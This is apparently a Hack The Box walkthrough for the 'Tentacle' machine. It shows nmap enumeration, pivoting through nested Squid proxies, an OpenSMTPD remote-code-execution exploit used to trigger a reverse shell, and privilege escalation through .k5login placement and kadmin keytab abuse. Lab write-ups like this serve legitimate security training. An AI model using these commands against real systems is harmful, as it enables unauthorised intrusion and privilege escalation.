---
title: "HTB - Tentacle"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "Squid Proxy", "Kerberos", "Linux", "Multi-hop", "Privilege Escalation"]
summary: ""
---

## 🔍 Initial Enumeration

```bash
sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.10.224 -oG allPorts
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain (BIND 9.11)
88/tcp   open  kerberos-sec
3128/tcp open  squid-http
```

- Found Squid Proxy on port 3128 exposing admin email.
- Discovered internal DNS pointing to `realcorp.htb` and `srv01.realcorp.htb`
- Enumerated with `dig`, `dnsenum`, and discovered more subdomains:
  - `proxy.realcorp.htb` → 10.197.243.77
  - `wpad.realcorp.htb` → 10.197.243.31

## 🌐 Proxy Enumeration (Nested)

- Used `proxychains` to route through proxies:
  - First through 10.10.10.224:3128
  - Then through 10.197.243.77:3128
- Discovered internal network: `10.241.251.0/24`
- Scanned using Bash loop:
  ```bash
  for port in 21 22 25 80 88 443 8080; do for i in $(seq 1 254); do ... done; done
  ```

## 📡 SMTP Exploit on 10.241.251.113

- Found OpenSMTPD on port 25
- Used [Exploit 47984](https://www.exploit-db.com/exploits/47984) to achieve RCE via crafted SMTP request
- Switched recipient to valid Kerberos user: `j.nakazawa@realcorp.htb`

## 🐚 Reverse Shell Chain

- Hosted reverse shell payload via Python HTTP server
- Executed via SMTP injection:
  ```bash
  proxychains -q python3 47984.py 10.241.251.113 25 'bash /dev/shm/rev'
  ```
- Gained root on container `10.241.251.113`

## 🔐 Kerberos Authentication

- Found `.msmtprc` with credentials for `j.nakazawa`
- Configured `/etc/krb5.conf` for REALCORP.HTB realm
- Authenticated with:
  ```bash
  kinit j.nakazawa
  ssh -K j.nakazawa@10.10.10.224
  ```

## ⬆️ Privilege Escalation (Log Backup via Cron)

- Cron job by `admin` runs `/usr/local/bin/log_backup.sh`
- We placed `.k5login` with our principal in `/var/log/squid/` to gain access
- Logged in as `admin`

## 🎯 Root via Kerberos Keytab

- Found `/etc/krb5.keytab` readable by `admin`
- Used:
  ```bash
  kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
  addprinc root@REALCORP.HTB
  ```
- Switched to root using:
  ```bash
  ksu
  ```

🏁 **Root access achieved through multi-hop Kerberos network traversal.**
